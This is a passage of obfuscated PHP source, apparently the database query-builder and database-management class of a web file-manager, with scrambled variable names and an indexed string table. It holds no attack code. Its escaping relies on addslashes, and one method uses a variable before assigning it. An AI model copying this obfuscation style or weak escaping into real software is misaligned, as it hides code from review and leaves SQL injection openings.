=& $_SERVER[œ—üé‹ê]; if (is_array($İƒ‰ªŸØ)) { $Ë«ÖÛåº = array(); foreach ($İƒ‰ªŸØ as $‘ß»ÌÙ‘ => $ÌïÂÃÆß) { if (!is_numeric($‘ß»ÌÙ‘)) { $Ë«ÖÛåº[] = $this->parseKey($‘ß»ÌÙ‘) . $œÇ¯ëñü[53] . $this->parseKey($ÌïÂÃÆß); } else { $Ë«ÖÛåº[] = $this->parseKey($‘ß»ÌÙ‘); } } $İƒ‰ªŸØ = $Ë«ÖÛåº; } elseif (is_string($İƒ‰ªŸØ)) { if (strstr($İƒ‰ªŸØ, $œÇ¯ëñü[53])) { return $İƒ‰ªŸØ; } $İƒ‰ªŸØ = explode($œÇ¯ëñü[50], $İƒ‰ªŸØ); array_walk($İƒ‰ªŸØ, array($this, $œÇ¯ëñü[1070])); } return $œÇ¯ëñü[1064] . trim(implode($œÇ¯ëñü[1166], $İƒ‰ªŸØ), $œÇ¯ëñü[475]) . $œÇ¯ëñü[1064]; } protected function parseWhere($îÂöı„Í) { $§°—¶Šõ =& $_SERVER[œ—üé‹ê]; $Š©­Ì¬Ì = $§°—¶Šõ[12]; if (is_string($îÂöı„Í)) { $Š©­Ì¬Ì = $îÂöı„Í; } else { $ÈÛ¥Ê¿ = isset($îÂöı„Í[$§°—¶Šõ[1167]]) ? strtoupper($îÂöı„Í[$§°—¶Šõ[1167]]) : $§°—¶Šõ[12]; if (in_array($ÈÛ¥Ê¿, array($§°—¶Šõ[1168], $§°—¶Šõ[1169], $§°—¶Šõ[1170]))) { $ÈÛ¥Ê¿ = $§°—¶Šõ[53] . $ÈÛ¥Ê¿ . $§°—¶Šõ[53]; unset($îÂöı„Í[$§°—¶Šõ[1167]]); } else { $ÈÛ¥Ê¿ = $§°—¶Šõ[1171]; } foreach ($îÂöı„Í as $àúó–Á˜ => $ÓªÕ“ª) { $Š©­Ì¬Ì .= $§°—¶Šõ[355]; if (is_numeric($àúó–Á˜)) { $àúó–Á˜ = $§°—¶Šõ[1172]; } if (0 === strpos($àúó–Á˜, $§°—¶Šõ[11])) { $Š©­Ì¬Ì .= $this->parseThinkWhere($àúó–Á˜, $ÓªÕ“ª); } else { if (!preg_match($§°—¶Šõ[1173], trim($àúó–Á˜))) { think_exception(think_lang($§°—¶Šõ[1174]) . $§°—¶Šõ[4] . $àúó–Á˜); } $íÖôÍ€ = is_array($ÓªÕ“ª) && isset($ÓªÕ“ª[$§°—¶Šõ[1175]]); $àúó–Á˜ = trim($àúó–Á˜); if (strpos($àúó–Á˜, $§°—¶Šõ[212])) { $è÷ÓšÔê = explode($§°—¶Šõ[212], $àúó–Á˜); $ù’Ç³ = array(); foreach ($è÷ÓšÔê as $…œÄáÁ => $Ê•µñú) { $Ùú›åÉÍ = $íÖôÍ€ ? $ÓªÕ“ª[$…œÄáÁ] : $ÓªÕ“ª; $ù’Ç³[] = $§°—¶Šõ[337] . $this->parseWhereItem($this->parseKey($Ê•µñú), $Ùú›åÉÍ) . $§°—¶Šõ[1069]; } $Š©­Ì¬Ì .= implode($§°—¶Šõ[1176], $ù’Ç³); } elseif (strpos($àúó–Á˜, $§°—¶Šõ[284])) { $è÷ÓšÔê = explode($§°—¶Šõ[284], $àúó–Á˜); $ù’Ç³ = array(); foreach ($è÷ÓšÔê as $…œÄáÁ => $Ê•µñú) { $Ùú›åÉÍ = $íÖôÍ€ ? $ÓªÕ“ª[$…œÄáÁ] : $ÓªÕ“ª; $ù’Ç³[] = $§°—¶Šõ[337] . $this->parseWhereItem($this->parseKey($Ê•µñú), $Ùú›åÉÍ) . $§°—¶Šõ[1069]; } $Š©­Ì¬Ì .= implode($§°—¶Šõ[1171], $ù’Ç³); } else { $Š©­Ì¬Ì .= $this->parseWhereItem($this->parseKey($àúó–Á˜), $ÓªÕ“ª); } } $Š©­Ì¬Ì .= $§°—¶Šõ[356] . $ÈÛ¥Ê¿; } $Š©­Ì¬Ì = substr($Š©­Ì¬Ì, 0, -strlen($ÈÛ¥Ê¿)); } return empty($Š©­Ì¬Ì) ? $§°—¶Šõ[12] : $§°—¶Šõ[1177] . $Š©­Ì¬Ì; } protected function parseWhereItem($ó±ëï½Ï, $§ü±Äôî) { $ÜïÚŞƒ =& $_SERVER[œ—üé‹ê]; $Õ©í‰òÊ = $ÜïÚŞƒ[12]; if (is_array($§ü±Äôî)) { if (is_string($§ü±Äôî[0])) { $Õã‰ş´´ = strtolower($§ü±Äôî[0]); if (in_array($§ü±Äôî[0], array($ÜïÚŞƒ[464], $ÜïÚŞƒ[1178], $ÜïÚŞƒ[1179], $ÜïÚŞƒ[1180], $ÜïÚŞƒ[1181], $ÜïÚŞƒ[1182]))) { $Õ©í‰òÊ .= $ó±ëï½Ï . $ÜïÚŞƒ[53] . $§ü±Äôî[0] . $ÜïÚŞƒ[53] . $this->parseValue($§ü±Äôî[1]); } elseif (preg_match($ÜïÚŞƒ[1183], $§ü±Äôî[0])) { $Õ©í‰òÊ .= $ó±ëï½Ï . $ÜïÚŞƒ[53] . $this->exp[$Õã‰ş´´] . $ÜïÚŞƒ[53] . $this->parseValue($§ü±Äôî[1]); } elseif (preg_match($ÜïÚŞƒ[1184], $§ü±Äôî[0])) { if (is_array($§ü±Äôî[1])) { $–™· = isset($§ü±Äôî[2]) ? strtoupper($§ü±Äôî[2]) : $ÜïÚŞƒ[1169]; if (in_array($–™·, array($ÜïÚŞƒ[1168], $ÜïÚŞƒ[1169], $ÜïÚŞƒ[1170]))) { $©÷øù“À = array(); foreach ($§ü±Äôî[1] as $èø«Ê¸‘) { $©÷øù“À[] = $ó±ëï½Ï . $ÜïÚŞƒ[53] . $this->exp[$Õã‰ş´´] . $ÜïÚŞƒ[53] . $this->parseValue($èø«Ê¸‘); } $Õ©í‰òÊ .= $ÜïÚŞƒ[337] . implode($ÜïÚŞƒ[53] . $–™· . $ÜïÚŞƒ[53], $©÷øù“À) . $ÜïÚŞƒ[1069]; } } else { $Õ©í‰òÊ .= $ó±ëï½Ï . $ÜïÚŞƒ[53] . $this->exp[$Õã‰ş´´] . $ÜïÚŞƒ[53] . $this->parseValue($§ü±Äôî[1]); } } elseif ($ÜïÚŞƒ[372] == $Õã‰ş´´) { $Õ©í‰òÊ .= $ÜïÚŞƒ[1067] . $ó±ëï½Ï . $ÜïÚŞƒ[53] . $§ü±Äôî[1] . $ÜïÚŞƒ[1185]; } elseif (preg_match($ÜïÚŞƒ[1186], $§ü±Äôî[0])) { $Õ©í‰òÊ .= $§ü±Äôî[0]; } elseif (preg_match($ÜïÚŞƒ[1187], $§ü±Äôî[0])) { if (isset($§ü±Äôî[2]) && $ÜïÚŞƒ[372] == $§ü±Äôî[2]) { $Õ©í‰òÊ .= $ó±ëï½Ï . $ÜïÚŞƒ[53] . $this->exp[$Õã‰ş´´] . $ÜïÚŞƒ[53] . $§ü±Äôî[1]; } else { if (is_string($§ü±Äôî[1])) { $§ü±Äôî[1] = explode($ÜïÚŞƒ[50], $§ü±Äôî[1]); } $ç…ÎâÅ­ = implode($ÜïÚŞƒ[50], $this->parseValue($§ü±Äôî[1])); $Õ©í‰òÊ .= $ó±ëï½Ï . $ÜïÚŞƒ[53] . $this->exp[$Õã‰ş´´] . $ÜïÚŞƒ[1067] . $ç…ÎâÅ­ . $ÜïÚŞƒ[1069]; } } elseif (preg_match($ÜïÚŞƒ[1188], $§ü±Äôî[0])) { $½å’œŠã = is_string($§ü±Äôî[1]) ? explode($ÜïÚŞƒ[50], $§ü±Äôî[1]) : $§ü±Äôî[1]; $Õ©í‰òÊ .= $ÜïÚŞƒ[1067] . $ó±ëï½Ï . $ÜïÚŞƒ[53] . $this->exp[$Õã‰ş´´] . $ÜïÚŞƒ[53] . $this->parseValue($½å’œŠã[0]) . $ÜïÚŞƒ[1171] . $this->parseValue($½å’œŠã[1]) . $ÜïÚŞƒ[356]; } else { think_exception(think_lang($ÜïÚŞƒ[1174]) . $ÜïÚŞƒ[4] . $§ü±Äôî[0]); } } else { $Á¢Ó›šû = count($§ü±Äôî); $®È£á¬® = $ÜïÚŞƒ[12]; if (is_string($§ü±Äôî[$Á¢Ó›šû - 1])) { $®È£á¬® = isset($§ü±Äôî[$Á¢Ó›šû - 1]) ? strtoupper($§ü±Äôî[$Á¢Ó›šû - 1]) : $ÜïÚŞƒ[12]; if (in_array($®È£á¬®, array($ÜïÚŞƒ[1168], $ÜïÚŞƒ[1169], $ÜïÚŞƒ[1170]))) { $Á¢Ó›šû = $Á¢Ó›šû - 1; } } else { $®È£á¬® = $ÜïÚŞƒ[1168]; } for ($ô¦€˜‚Â = 0; $ô¦€˜‚Â < $Á¢Ó›šû; $ô¦€˜‚Â++) { $½å’œŠã = is_array($§ü±Äôî[$ô¦€˜‚Â]) ? $§ü±Äôî[$ô¦€˜‚Â][1] : $§ü±Äôî[$ô¦€˜‚Â]; if ($ÜïÚŞƒ[372] == strtolower($§ü±Äôî[$ô¦€˜‚Â][0])) { $Õ©í‰òÊ .= $ÜïÚŞƒ[337] . $ó±ëï½Ï . $ÜïÚŞƒ[53] . $½å’œŠã . $ÜïÚŞƒ[1185] . $®È£á¬® . $ÜïÚŞƒ[53]; } else { $Ôå®³ÆÍ = is_array($§ü±Äôî[$ô¦€˜‚Â]) ? $this->exp[strtolower($§ü±Äôî[$ô¦€˜‚Â][0])] : $ÜïÚŞƒ[464]; if (!$Ôå®³ÆÍ && is_array($§ü±Äôî[$ô¦€˜‚Â]) && in_array($§ü±Äôî[$ô¦€˜‚Â][0], array($ÜïÚŞƒ[464], $ÜïÚŞƒ[1178], $ÜïÚŞƒ[1179], $ÜïÚŞƒ[1180], $ÜïÚŞƒ[1181], $ÜïÚŞƒ[1182]))) { $Ôå®³ÆÍ = $§ü±Äôî[$ô¦€˜‚Â][0]; } $Õ©í‰òÊ .= $ÜïÚŞƒ[337] . $ó±ëï½Ï . $ÜïÚŞƒ[53] . $Ôå®³ÆÍ . $ÜïÚŞƒ[53] . $this->parseValue($½å’œŠã) . $ÜïÚŞƒ[1185] . $®È£á¬® . $ÜïÚŞƒ[53]; } } $Õ©í‰òÊ = substr($Õ©í‰òÊ, 0, -4); } } else { $Õ©í‰òÊ .= $ó±ëï½Ï . $ÜïÚŞƒ[1189] . $this->parseValue($§ü±Äôî); } return $Õ©í‰òÊ; } protected function parseThinkWhere($Ğ¼Ú±ªá, $ÍÍµ×…) { $¬µÎÏåã =& $_SERVER[œ—üé‹ê]; $û„„…Öá = $¬µÎÏåã[12]; switch ($Ğ¼Ú±ªá) { case $¬µÎÏåã[427]: $û„„…Öá = $ÍÍµ×…; break; case $¬µÎÏåã[1172]: $û„„…Öá = is_string($ÍÍµ×…) ? $ÍÍµ×… : substr($this->parseWhere($ÍÍµ×…), 6); break; case $¬µÎÏåã[1190]: parse_str($ÍÍµ×…, $‡ŒÁÂÄÏ); if (isset($‡ŒÁÂÄÏ[$¬µÎÏåã[1167]])) { $èì¨½şş = $¬µÎÏåã[53] . strtoupper($‡ŒÁÂÄÏ[$¬µÎÏåã[1167]]) . $¬µÎÏåã[53]; unset($‡ŒÁÂÄÏ[$¬µÎÏåã[1167]]); } else { $èì¨½şş = $¬µÎÏåã[1171]; } $éà¡×Å = array(); foreach ($‡ŒÁÂÄÏ as $Ö©ÆªÃó => $ìıòÏË) { $éà¡×Å[] = $this->parseKey($Ö©ÆªÃó) . $¬µÎÏåã[1189] . $this->parseValue($ìıòÏË); } $û„„…Öá = implode($èì¨½şş, $éà¡×Å); break; } return $û„„…Öá; } protected function parseLimit($†•çü¸›) { $¡¨æ“¨ =& $_SERVER[œ—üé‹ê]; return !empty($†•çü¸›) ? $¡¨æ“¨[51] . $†•çü¸› . $¡¨æ“¨[53] : $¡¨æ“¨[12]; } protected function parseJoin($¸ÙÉÙÖÑ) { $ƒ±ºÜ¨ =& $_SERVER[œ—üé‹ê]; $áï¯›¸± = $ƒ±ºÜ¨[12]; if (!empty($¸ÙÉÙÖÑ)) { if (is_array($¸ÙÉÙÖÑ)) { foreach ($¸ÙÉÙÖÑ as $£İè¿˜¬ => $ßÂ§¯½) { if (!1 !== stripos($ßÂ§¯½, $ƒ±ºÜ¨[1191])) { $áï¯›¸± .= $ƒ±ºÜ¨[53] . $ßÂ§¯½; } else { $áï¯›¸± .= $ƒ±ºÜ¨[1192] . $ßÂ§¯½; } } } else { $áï¯›¸± .= $ƒ±ºÜ¨[1192] . $¸ÙÉÙÖÑ; } } $áï¯›¸± = preg_replace($ƒ±ºÜ¨[1193], think_config($ƒ±ºÜ¨[1097]) . $ƒ±ºÜ¨[1194], $áï¯›¸±); return $áï¯›¸±; } protected function parseOrder($šá•ñÆ×) { $æ³˜ÎÃ =& $_SERVER[œ—üé‹ê]; if (is_array($šá•ñÆ×)) { $¯Ôœ‚¾ú = array(); foreach ($šá•ñÆ× as $¸¥Şªá => $±ŸË¢Å±) { if (is_numeric($¸¥Şªá)) { $¯Ôœ‚¾ú[] = $this->parseKey($±ŸË¢Å±); } else { $±ŸË¢Å± = in_array(strtoupper(trim($±ŸË¢Å±)), array($æ³˜ÎÃ[1195], $æ³˜ÎÃ[1196])) ? $æ³˜ÎÃ[53] . $±ŸË¢Å± : $æ³˜ÎÃ[12]; if (preg_match($æ³˜ÎÃ[1197], $¸¥Şªá)) { $¯Ôœ‚¾ú[] = $this->parseKey($¸¥Şªá) . $±ŸË¢Å±; } else { think_exception($æ³˜ÎÃ[1198] . $¸¥Şªá); } } } $šá•ñÆ× = implode($æ³˜ÎÃ[50], $¯Ôœ‚¾ú); } return !empty($šá•ñÆ×) ? $æ³˜ÎÃ[1199] . $šá•ñÆ× : $æ³˜ÎÃ[12]; } protected function parseGroup($¦ú‡¨äø) { $Ò¶˜å  =& $_SERVER[œ—üé‹ê]; return !empty($¦ú‡¨äø) ? $Ò¶˜å [1200] . $¦ú‡¨äø : $Ò¶˜å [12]; } protected function parseHaving($ÍÎ­×ô¡) { $äº´ÑÎ› =& $_SERVER[œ—üé‹ê]; return !empty($ÍÎ­×ô¡) ? $äº´ÑÎ›[1201] . $ÍÎ­×ô¡ : $äº´ÑÎ›[12]; } protected function parseComment($‘åŠáµ) { $ÖÜ—³µ³ =& $_SERVER[œ—üé‹ê]; return !empty($‘åŠáµ) ? $ÖÜ—³µ³[1202] . $‘åŠáµ . $ÖÜ—³µ³[1203] : $ÖÜ—³µ³[12]; } protected function parseDistinct($²Ÿ“Ğ•¹) { $ó†œÍïÈ =& $_SERVER[œ—üé‹ê]; return !empty($²Ÿ“Ğ•¹) ? $ó†œÍïÈ[1204] : $ó†œÍïÈ[12]; } protected function parseUnion($ãòŒÔŞŠ) { $½ˆĞÇÛ =& $_SERVER[œ—üé‹ê]; if (empty($ãòŒÔŞŠ)) { return $½ˆĞÇÛ[12]; } if (isset($ãòŒÔŞŠ[$½ˆĞÇÛ[423]])) { $ñ†±ëòÊ = $½ˆĞÇÛ[1205]; unset($ãòŒÔŞŠ[$½ˆĞÇÛ[423]]); } else { $ñ†±ëòÊ = $½ˆĞÇÛ[1206]; } foreach ($ãòŒÔŞŠ as $£ëÄ¹µÒ) { $à¼€ˆ²[] = $ñ†±ëòÊ . (is_array($£ëÄ¹µÒ) ? $this->buildSelectSql($£ëÄ¹µÒ) : $£ëÄ¹µÒ); } return implode($½ˆĞÇÛ[53], $à¼€ˆ²); } public function insert($ú¡ëâ÷, $¥è£´ = array(), $½øŒƒ£é = false) { $âÓåÚƒ¹ =& $_SERVER[œ—üé‹ê]; $Àã˜„­ä = $ÒûŒÚŠò = array(); $this->model = $¥è£´[$âÓåÚƒ¹[359]]; foreach ($ú¡ëâ÷ as $€ÊÂæ‡û => $ğõ¬˜ä•) { if (is_array($ğõ¬˜ä•) && $âÓåÚƒ¹[372] == $ğõ¬˜ä•[0]) { $ÒûŒÚŠò[] = $this->parseKey($€ÊÂæ‡û); $Àã˜„­ä[] = $ğõ¬˜ä•[1]; } elseif (is_scalar($ğõ¬˜ä•) || is_null($ğõ¬˜ä•)) { $ÒûŒÚŠò[] = $this->parseKey($€ÊÂæ‡û); $Àã˜„­ä[] = $this->parseValue($ğõ¬˜ä•); } } $×ä²êÛ¨ = ($½øŒƒ£é ? $âÓåÚƒ¹[1071] : $âÓåÚƒ¹[1072]) . $âÓåÚƒ¹[1073] . $this->parseTable($¥è£´[$âÓåÚƒ¹[357]]) . $âÓåÚƒ¹[1067] . implode($âÓåÚƒ¹[50], $ÒûŒÚŠò) . $âÓåÚƒ¹[1068] . implode($âÓåÚƒ¹[50], $Àã˜„­ä) . $âÓåÚƒ¹[1069]; $×ä²êÛ¨ .= $this->parseLock(isset($¥è£´[$âÓåÚƒ¹[1008]]) ? $¥è£´[$âÓåÚƒ¹[1008]] : !1); $×ä²êÛ¨ .= $this->parseComment(!empty($¥è£´[$âÓåÚƒ¹[429]]) ? $¥è£´[$âÓåÚƒ¹[429]] : $âÓåÚƒ¹[12]); return $this->execute($×ä²êÛ¨, $this->parseBind(!empty($¥è£´[$âÓåÚƒ¹[361]]) ? $¥è£´[$âÓåÚƒ¹[361]] : array())); } public function selectInsert($½áÊ¾Öâ, $õæ’ÕË, $ÖŒåÒ = array()) { $–·ù‡ =& $_SERVER[œ—üé‹ê]; $this->model = $ÖŒåÒ[$–·ù‡[359]]; if (is_string($½áÊ¾Öâ)) { $½áÊ¾Öâ = explode($–·ù‡[50], $½áÊ¾Öâ); } array_walk($½áÊ¾Öâ, array($this, $–·ù‡[1070])); $²“š†›ù = $–·ù‡[1207] . $this->parseTable($õæ’ÕË) . $–·ù‡[1067] . implode($–·ù‡[50], $½áÊ¾Öâ) . $–·ù‡[1185]; $²“š†›ù .= $this->buildSelectSql($ÖŒåÒ); return $this->execute($²“š†›ù, $this->parseBind(!empty($ÖŒåÒ[$–·ù‡[361]]) ? $ÖŒåÒ[$–·ù‡[361]] : array())); } public function update($ø˜µ…›¥, $È¢§Öç) { $­¾ç«€€ =& $_SERVER[œ—üé‹ê]; $this->model = $È¢§Öç[$­¾ç«€€[359]]; $æò¬½ª– = $­¾ç«€€[1208] . $this->parseTable($È¢§Öç[$­¾ç«€€[357]]) . $this->parseSet($ø˜µ…›¥) . $this->parseWhere(!empty($È¢§Öç[$­¾ç«€€[353]]) ? $È¢§Öç[$­¾ç«€€[353]] : $­¾ç«€€[12]) . $this->parseOrder(!empty($È¢§Öç[$­¾ç«€€[441]]) ? $È¢§Öç[$­¾ç«€€[441]] : $­¾ç«€€[12]) . $this->parseLimit(!empty($È¢§Öç[$­¾ç«€€[368]]) ? $È¢§Öç[$­¾ç«€€[368]] : $­¾ç«€€[12]) . $this->parseLock(isset($È¢§Öç[$­¾ç«€€[1008]]) ? $È¢§Öç[$­¾ç«€€[1008]] : !1) . $this->parseComment(!empty($È¢§Öç[$­¾ç«€€[429]]) ? $È¢§Öç[$­¾ç«€€[429]] : $­¾ç«€€[12]); return $this->execute($æò¬½ª–, $this->parseBind(!empty($È¢§Öç[$­¾ç«€€[361]]) ? $È¢§Öç[$­¾ç«€€[361]] : array())); } public function delete($Œè½ı™° = array()) { $ò‰›‰°Â =& $_SERVER[œ—üé‹ê]; $this->model = $Œè½ı™°[$ò‰›‰°Â[359]]; $ìÅòã‘È = $ò‰›‰°Â[1209] . $this->parseTable($Œè½ı™°[$ò‰›‰°Â[357]]) . $this->parseWhere(!empty($Œè½ı™°[$ò‰›‰°Â[353]]) ? $Œè½ı™°[$ò‰›‰°Â[353]] : $ò‰›‰°Â[12]) . $this->parseOrder(!empty($Œè½ı™°[$ò‰›‰°Â[441]]) ? $Œè½ı™°[$ò‰›‰°Â[441]] : $ò‰›‰°Â[12]) . $this->parseLimit(!empty($Œè½ı™°[$ò‰›‰°Â[368]]) ? $Œè½ı™°[$ò‰›‰°Â[368]] : $ò‰›‰°Â[12]) . $this->parseLock(isset($Œè½ı™°[$ò‰›‰°Â[1008]]) ? $Œè½ı™°[$ò‰›‰°Â[1008]] : !1) . $this->parseComment(!empty($Œè½ı™°[$ò‰›‰°Â[429]]) ? $Œè½ı™°[$ò‰›‰°Â[429]] : $ò‰›‰°Â[12]); return $this->execute($ìÅòã‘È, $this->parseBind(!empty($Œè½ı™°[$ò‰›‰°Â[361]]) ? $Œè½ı™°[$ò‰›‰°Â[361]] : array())); } public function select($ˆÃû´×Ã = array()) { $¼ÒøéÁ³ =& $_SERVER[œ—üé‹ê]; $this->model = $ˆÃû´×Ã[$¼ÒøéÁ³[359]]; $Ï×ú×Æê = $this->buildSelectSql($ˆÃû´×Ã); $òÚ—®íö = isset($ˆÃû´×Ã[$¼ÒøéÁ³[424]]) ? $ˆÃû´×Ã[$¼ÒøéÁ³[424]] : !1; if ($òÚ—®íö) { $“µ¤µÅã = is_string($òÚ—®íö[$¼ÒøéÁ³[95]]) ? $òÚ—®íö[$¼ÒøéÁ³[95]] : $¼ÒøéÁ³[1210] . md5($Ï×ú×Æê); $…¢”á² = think_cache($“µ¤µÅã, $¼ÒøéÁ³[12], $òÚ—®íö); if (!1 !== $…¢”á²) { return $…¢”á²; } } $Ç¬šÚş“ = $this->query($Ï×ú×Æê, $this->parseBind(!empty($ˆÃû´×Ã[$¼ÒøéÁ³[361]]) ? $ˆÃû´×Ã[$¼ÒøéÁ³[361]] : array())); if ($òÚ—®íö && !1 !== $Ç¬šÚş“) { think_cache($“µ¤µÅã, $Ç¬šÚş“, $òÚ—®íö); } return $Ç¬šÚş“; } public function buildSelectSql($ß‹éÅáµ = array()) { $Ô©‰¤ÛÏ =& $_SERVER[œ—üé‹ê]; if (isset($ß‹éÅáµ[$Ô©‰¤ÛÏ[428]])) { if (strpos($ß‹éÅáµ[$Ô©‰¤ÛÏ[428]], $Ô©‰¤ÛÏ[50])) { list($®½å·†ƒ, $…ã”Ï‰è) = explode($Ô©‰¤ÛÏ[50], $ß‹éÅáµ[$Ô©‰¤ÛÏ[428]]); } else { $®½å·†ƒ = $ß‹éÅáµ[$Ô©‰¤ÛÏ[428]]; } $®½å·†ƒ = $®½å·†ƒ ? $®½å·†ƒ : 1; $…ã”Ï‰è = isset($…ã”Ï‰è) ? $…ã”Ï‰è : (is_numeric($ß‹éÅáµ[$Ô©‰¤ÛÏ[368]]) ? $ß‹éÅáµ[$Ô©‰¤ÛÏ[368]] : 20); $İºó´íü = $…ã”Ï‰è * ((int) $®½å·†ƒ - 1); $ß‹éÅáµ[$Ô©‰¤ÛÏ[368]] = $İºó´íü . $Ô©‰¤ÛÏ[50] . $…ã”Ï‰è; } if (think_config($Ô©‰¤ÛÏ[1211])) { $¨ëÚË» = $Ô©‰¤ÛÏ[1212] . md5(serialize($ß‹éÅáµ)); $ÃöŒåª = think_cache($¨ëÚË»); if ($ÃöŒåª) { return $ÃöŒåª; } } $Åñ›Â = $this->parseSql($this->selectSql, $ß‹éÅáµ); $Åñ›Â .= $this->parseLock(isset($ß‹éÅáµ[$Ô©‰¤ÛÏ[1008]]) ? $ß‹éÅáµ[$Ô©‰¤ÛÏ[1008]] : !1); if (isset($¨ëÚË»)) { think_cache($¨ëÚË», $Åñ›Â); } return $Åñ›Â; } public function parseSql($âÁ½½¿, $éöÅ¹Êì = array()) { $ €ºçÑ =& $_SERVER[œ—üé‹ê]; $âÁ½½¿ = str_replace(array($ €ºçÑ[1213], $ €ºçÑ[1214], $ €ºçÑ[1215], $ €ºçÑ[1216], $ €ºçÑ[1217], $ €ºçÑ[1218], $ €ºçÑ[1219], $ €ºçÑ[1220], $ €ºçÑ[1221], $ €ºçÑ[1222], $ €ºçÑ[1223]), array($this->parseTable("{$éöÅ¹Êì[$ €ºçÑ[357]]}"), $this->parseDistinct(isset($éöÅ¹Êì[$ €ºçÑ[1224]]) ? $éöÅ¹Êì[$ €ºçÑ[1224]] : !1), $this->parseField(!empty($éöÅ¹Êì[$ €ºçÑ[351]]) ? $éöÅ¹Êì[$ €ºçÑ[351]] : $ €ºçÑ[220]), $this->parseJoin(!empty($éöÅ¹Êì[$ €ºçÑ[360]]) ? $éöÅ¹Êì[$ €ºçÑ[360]] : $ €ºçÑ[12]), $this->parseWhere(!empty($éöÅ¹Êì[$ €ºçÑ[353]]) ? $éöÅ¹Êì[$ €ºçÑ[353]] : $ €ºçÑ[12]), $this->parseGroup(!empty($éöÅ¹Êì[$ €ºçÑ[598]]) ? $éöÅ¹Êì[$ €ºçÑ[598]] : $ €ºçÑ[12]), $this->parseHaving(!empty($éöÅ¹Êì[$ €ºçÑ[1225]]) ? $éöÅ¹Êì[$ €ºçÑ[1225]] : $ €ºçÑ[12]), $this->parseOrder(!empty($éöÅ¹Êì[$ €ºçÑ[441]]) ? $éöÅ¹Êì[$ €ºçÑ[441]] : $ €ºçÑ[12]), $this->parseLimit(!empty($éöÅ¹Êì[$ €ºçÑ[368]]) ? $éöÅ¹Êì[$ €ºçÑ[368]] : $ €ºçÑ[12]), $this->parseUnion(!empty($éöÅ¹Êì[$ €ºçÑ[422]]) ? $éöÅ¹Êì[$ €ºçÑ[422]] : $ €ºçÑ[12]), $this->parseComment(!empty($éöÅ¹Êì[$ €ºçÑ[429]]) ? $éöÅ¹Êì[$ €ºçÑ[429]] : $ €ºçÑ[12])), $âÁ½½¿); return $âÁ½½¿; } public function getLastSql($ˆÓ–•ºó = '') { return $ˆÓ–•ºó ? $this->modelSql[$ˆÓ–•ºó] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ ÊÅÉğÆ) { return addslashes($ ÊÅÉğÆ); } public function setModel($Óàâãş) { $this->model = $Óàâãş; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { public $message = ''; function __construct($§³º‚â¡ = array()) { $ˆ¶ÔÈøÃ =& $_SERVER[œ—üé‹ê]; if (empty($§³º‚â¡)) { $§³º‚â¡ = $GLOBALS[$ˆ¶ÔÈøÃ[6]][$ˆ¶ÔÈøÃ[21]]; } $this->database = $§³º‚â¡; } public function model($ë±Á‚³ = '') { return new ModelBase($ë±Á‚³, $_SERVER[œ—üé‹ê][12], $this->database); } public function db($õ…ºÂÜ = false) { $Ô™”„ğ =& $_SERVER[œ—üé‹ê]; $„ëĞÅ‚ü = array_change_key_case($this->database); if ($this->dbType() == $Ô™”„ğ[13] || !$õ…ºÂÜ) { return $this->model()->db(); } $¨¯ˆÛâÆ = $„ëĞÅ‚ü[$Ô™”„ğ[1139]]; $„ëĞÅ‚ü[$Ô™”„ğ[1139]] = $Ô™”„ğ[12]; if ($„ëĞÅ‚ü[$Ô™”„ğ[1134]] == $Ô™”„ğ[1131]) { $Ôßôïêö = $„ëĞÅ‚ü[$Ô™”„ğ[1140]]; $„ëĞÅ‚ü[$Ô™”„ğ[1140]] = substr($Ôßôïêö, 0, strrpos($Ôßôïêö, $Ô™”„ğ[1226])); } $this->database = $„ëĞÅ‚ü; $Ô¨ªİö‚ = $this->model()->db(); $ÁÂíÂß = $Ô¨ªİö‚->execute("\x73\x68\x6f\x77\x20\144\141\164\x61\x62\141\x73\x65\163\x20\x6c\151\153\145\x20\x27{$¨¯ˆÛâÆ}\x27"); if (!$ÁÂíÂß) { try { $Ô¨ªİö‚->execute("\x63\162\145\x61\x74\145\x20\144\141\x74\141\x62\141\163\145\40\x60{$¨¯ˆÛâÆ}\140"); } catch (Exception $ìš«­í¿) { $this->message = $ìš«­í¿->getMessage(); return !1; } } $„ëĞÅ‚ü[$Ô™”„ğ[1139]] = $¨¯ˆÛâÆ; if ($„ëĞÅ‚ü[$Ô™”„ğ[1134]] == $Ô™”„ğ[1131]) { $„ëĞÅ‚ü[$Ô™”„ğ[1140]] .= $Ô™”„ğ[1226] . $¨¯ˆÛâÆ; } $this->database = $„ëĞÅ‚ü; try { $Ô¨ªİö‚->execute("\165\163\x65\40\x60{$¨¯ˆÛâÆ}\x60"); } catch (Exception $ìš«­í¿) { $this->message = $ìš«­í¿->getMessage(); return !1; } return $Ô¨ªİö‚; } public function createTable($¨¾È’’¯, &$ˆ‹üëÎ¥) { $½ÆÆ¤ÊÎ =& $_SERVER[œ—üé‹ê]; if (!IO::exist($¨¾È’’¯)) { show_json(LNG($½ÆÆ¤ÊÎ[1227]), !1); } $ş°ÌÖŒ· = $this->model()->db(); $šºØèŞ² = sqlSplit(IO::getContent($¨¾È’’¯)); foreach ($šºØèŞ² as $Úóõöè…) { $†ù²–ê‡ = stripos($Úóõöè…, $½ÆÆ¤ÊÎ[1228]) === 0; if ($†ù²–ê‡) { $ˆ‹üëÎ¥->task[$½ÆÆ¤ÊÎ[961]] += 1; } $ş°ÌÖŒ·->execute($Úóõöè…); if ($†ù²–ê‡) { preg_match($½ÆÆ¤ÊÎ[1229], $Úóõöè…, $¦¿ÏåÉõ); $ˆ‹üëÎ¥->task[$½ÆÆ¤ÊÎ[1230]] = $¦¿ÏåÉõ[1]; $ˆ‹üëÎ¥->update(1); } } } public function insertTable($æÅúÌè„, &$Ûü¯œ¾Ó) { $ôİŒ™¶› =& $_SERVER[œ—üé‹ê]; $³Ã‰Îş˜ = $this->model()->db(); $Óƒà¼±Õ = $Ô­î”ê ? array($Ô­î”ê) : $³Ã‰Îş˜->getTables(); foreach ($æÅúÌè„ as $íƒËêà) { $Ô­î”ê = basename($íƒËêà, $ôİŒ™¶›[900]); if (!in_array($Ô­î”ê, $Óƒà¼±Õ)) { continue; } $Ûü¯œ¾Ó->task[$ôİŒ™¶›[1230]] = $Ô­î”ê; if ($Ô­î”ê == $ôİŒ™¶›[472]) { continue; } if (get_filesize($íƒËêà) == 0) { continue; } $²×ø«ƒà = $this->sqlToDb($íƒËêà, $Ûü¯œ¾Ó); if (!$²×ø«ƒà) { show_json(LNG($ôİŒ™¶›[1231]) . 